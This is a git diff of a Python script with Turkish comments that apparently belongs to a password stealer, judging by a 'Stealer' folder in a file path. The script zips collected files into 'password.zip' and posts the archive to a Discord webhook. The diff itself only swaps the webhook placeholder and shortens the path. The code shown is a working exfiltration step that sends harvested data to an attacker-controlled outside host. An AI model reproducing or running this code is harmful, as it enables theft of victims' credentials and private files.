@@ -110,7 +110,7 @@ if __name__ == "__main__":
 
 # Ziplenecek dosyaların listesi
 
-url = "https://discord.com/api/webhooks/APİ_KEY_URL"
+url = "BURAYA DİSCORD WEBHOOKAPİ"
 
 # Dosya adı
 zip_file_name = 'password.zip'
@@ -123,9 +123,10 @@ with zipfile.ZipFile(zip_file_name, mode='w') as zip_file:
     for file_name in file_names:
         zip_file.write(file_name)
 
+
 # Dosya okuma ve Discord webhook gönderme
 # Zip file path
-zip_file_path = "C:\\Users\\Cengizhan\\Çalışmam\\Stealer\\password.zip"
+zip_file_path = "C:\\Users\\Cengizhan\\password.zip"
 
 # Open zip file in binary mode
 with open(zip_file_path, "rb") as f:
@@ -138,7 +139,6 @@ payload = {zip_file_path : file_content,}
 response = requests.post(url, files=payload)
 # Print the response status code
 # Dosyaları silme
-
 
 
 
